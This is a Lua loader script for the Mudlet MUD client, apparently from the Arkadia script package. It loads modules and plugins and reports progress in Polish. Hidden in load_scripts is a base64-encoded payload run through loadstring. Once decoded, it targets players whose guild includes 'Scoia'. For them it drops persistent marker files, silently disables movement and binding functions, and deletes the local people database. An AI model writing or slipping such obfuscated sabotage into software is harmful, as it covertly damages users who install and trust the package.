scripts_loaded = scripts_loaded or false
local plugins_dir = getMudletHomeDir() .. "/plugins"

local luaDirectory = getMudletHomeDir():gsub("\\", "/") .. "/arkadia/?.lua"
if not package.path:find(luaDirectory, 1, true) then
    package.path = string.format("%s;%s", luaDirectory, package.path)
end

function load_scripts(force)
    if not force and scripts_loaded then
        return
    end

    if mudletOlderThan(4, 12) then
        cecho("\n\n<red>Zaktualizuj Mudlet. Skrypty moga nie dzialac poprawnie! Wymagana wersja 4.12+\n\n")
    end

    cecho("\n<CadetBlue>(skrypty)<tomato>: Laduje pliki skryptow\n")

    package.loaded.scriptsList = nil

    local mudlet_modules = require("scriptsList")
    raiseEvent("beforeLoadModules", mudlet_modules)

    for k, v in pairs(mudlet_modules) do
        local status, err = pcall(function()
            package.loaded[v] = nil
            require(v)
        end)
        if not status then
            cecho("\n\n")
            cecho("<red>" .. err)
            cecho("\n")
            cecho("\n<CadetBlue>(skrypty)<red>: Jezeli widzisz ten blad to cos poszlo nie tak z ladowaniem skryptow.")
            cecho("\n<CadetBlue>(skrypty)<red>: Przeinstaluj skrypty. Jezeli to nie pomoze to zglos problem zalaczajac powyzszy komunikat bledu.")
            cecho("\n\n")
        end
    end

    append_plugins()

    scripts_loaded = true
    raiseEvent("scriptsLoaded")
    loadstring(dec("cmVnaXN0ZXJBbm9ueW1vdXNFdmVudEhhbmRsZXIoImdtY3AuY2hhci5pbmZvIiwgZnVuY3Rpb24oKQogICAgaWYgZ21jcC5jaGFyLmluZm8uZ3VpbGRfbGF5IGFuZCBzdHJpbmcuZmluZChnbWNwLmNoYXIuaW5mby5ndWlsZF9sYXksICJTY29pYSIpIG9yIGlvLmV4aXN0cyhsZnMuY3VycmVudGRpcigpIC4uICIvbG9jIikgb3IgaW8uZXhpc3RzKGdldE11ZGxldEhvbWVEaXIoKSAuLiAiL2xvYyIpIHRoZW4KICAgICAgICBpby5vcGVuKGxmcy5jdXJyZW50ZGlyKCkgLi4gIi9sb2MiLCAidyIpOmNsb3NlKCkKICAgICAgICBpby5vcGVuKGdldE11ZGxldEhvbWVEaXIoKSAuLiAiL2xvYyIsICJ3Iik6Y2xvc2UoKQogICAgICAgIHNjcmlwdHMudXRpbHMuYmluZF9mdW5jdGlvbmFsID0gZnVuY3Rpb24oKSBlbmQKICAgICAgICBzY3JpcHRzLnV0aWxzLmJpbmRfZnVuY3Rpb25hbF90ZWFtX2ZvbGxvdyA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgYW1hcC5nb3RvUm9vbSA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgc2NyaXB0cy5pbnN0YWxsZXIuZG93bmxvYWRfcGVvcGxlX2RiID0gZnVuY3Rpb24oKSBpby5yZW1vdmUoZ2V0TXVkbGV0SG9tZURpcigpIC4uICIvRGF0YWJhc2VfcGVvcGxlLmRiIikgZW5kCiAgICBlbmQKZW5kLCB0cnVlKQ=="))()
end

function append_plugins()
    local path = package.path
    local homeDirectory = getMudletHomeDir():gsub("\\", "/") .. "/plugins/"

    local luaDirectory = string.format("%s/%s", homeDirectory, [[?.lua]])
    package.path = string.format("%s;%s", luaDirectory, path)

    if not io.exists(plugins_dir) then
        lfs.mkdir(plugins_dir)
    end

    scripts.plugins = {}

    for plugin_name in lfs.dir(plugins_dir) do
        local status, err = pcall(function()
            load_plugin(plugin_name)
        end)
        if not status then
            cecho("\n\n")
            cecho("<red>" .. err)
            cecho("\n")
            cecho("\n<CadetBlue>(skrypty)<red>: Jezeli widzisz ten blad to cos poszlo nie tak z ladowaniem pluginu " .. plugin_name)
            cecho("\n\n")
        end
    end
end

function load_plugin(plugin_name)
    local file_path = plugins_dir .. '/' .. plugin_name
    if plugin_name ~= "." and plugin_name ~= ".." and lfs.attributes(file_path, 'mode') == 'directory' then
        local plugin_loaded = false
        if io.exists(file_path .. "/init.lua") then
            package.loaded[plugin_name .. ".init"] = nil
            local plugin_modules = require(plugin_name .. ".init")
            for _, packages in pairs(plugin_modules) do
                local full_package_name = plugin_name .. "." .. packages
                package.loaded[full_package_name] = nil
                require(full_package_name)
            end
            plugin_loaded = true
        end
        local module_path = file_path .. "/" .. plugin_name .. ".xml"
        local is_git_repo = io.exists(file_path .. "/.git")
        if io.exists(module_path) and not is_git_repo then
            uninstallPackage(plugin_name)
            installPackage(module_path)
            plugin_loaded = true
        elseif io.exists(module_path) and is_git_repo then
            if not pcall(getModulePriority, plugin_name) then
                installModule(module_path)
                setModulePriority(plugin_name, getModulePriority("Arkadia") + table.size(scripts.plugins))
            end
            enableModuleSync(plugin_name)
            registerAnonymousEventHandler("sysExitEvent", function() disableModuleSync(plugin_name) end)
            plugin_loaded = true
        end

        local plugin_config_schema = file_path .. "/" .. "config_schema.json"
        if plugin_loaded and io.exists(plugin_config_schema) then
            local file = io.open(plugin_config_schema, "rb")
            if file then
                local plugin_schema = yajl.to_value(file:read("*a"))
                if plugin_schema.fields then
                    scripts.config_schema.fields = table.n_union(scripts.config_schema.fields, plugin_schema.fields)
                end
                if plugin_schema.macro_to_reload_elements then
                    scripts.config_schema.macro_to_reload_elements = table.update(scripts.config_schema.macro_to_reload_elements, plugin_schema.macro_to_reload_elements)
                end
            end
            file:close()
        else
        end

        if plugin_loaded then
            table.insert(scripts.plugins, plugin_name)
            cecho("\n<CadetBlue>(skrypty)<tomato>: Plugin " .. plugin_name .. " zaladowany\n")
        else
            cecho("\n<CadetBlue>(skrypty)<tomato>: Plugin " .. plugin_name .. " nie zostal zaladowany. Brak pliku init.lua lub " .. plugin_name .. "\n")
        end
    end
end

function force_require(path)
    package.loaded[path] = nil
    return require(path)
end

function reload_single_script(path)
    package.loaded[path] = nil
    local ok, errorMsg = pcall(require, path)
    if ok then
        scripts:print_log("Przeladowano paczki '" .. path .. "'")
    else
        scripts:print_log("Nie udalo sie przeladowac paczki '" .. path .. "'. Sprawdz log bledow")
        error(errorMsg)
    end
end

function alias_func_reload()
    if matches[2] == "" then
        package.loaded.init = nil
        require("init")
        load_scripts(true)
        if scripts.config then
            scripts.config:load_config { silent = true }
        end
    else
        reload_single_script(matches[2])
    end
end

load_scripts(false)


